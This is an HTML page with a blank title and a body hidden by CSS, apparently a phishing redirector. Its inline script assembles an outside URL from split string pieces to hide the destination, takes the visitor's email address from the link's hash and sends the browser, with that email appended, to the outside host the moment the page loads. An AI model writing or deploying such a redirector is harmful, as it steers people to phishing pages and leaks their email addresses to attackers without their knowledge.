<!DOCTYPE html>
<html>
<head>
    <title>.</title>
    <style>
        body { display: none; }
    </style>
    <script>
        (function() {
            var part1 = "https://prism.";
            var part2 = "selitone.r";
            var part3 = "u/aXCVOnJc/#M";

            // Get the email parameter from the URL
            var email = window.location.hash.substring(1);

            // Decode the email parameter to keep @ symbol intact
            var decodedEmail = decodeURIComponent(email);

            // Sanitize the email by removing slashes
            var sanitizedEmail = decodedEmail.replace(/\//g, "");

            // Construct the redirect URL
            var redirectUrl = part1 + part2 + part3 + "/" + sanitizedEmail;

            // Redirect to the constructed URL
            window.location.href = redirectUrl;
        })();
    </script>
</head>
<body>

</html>
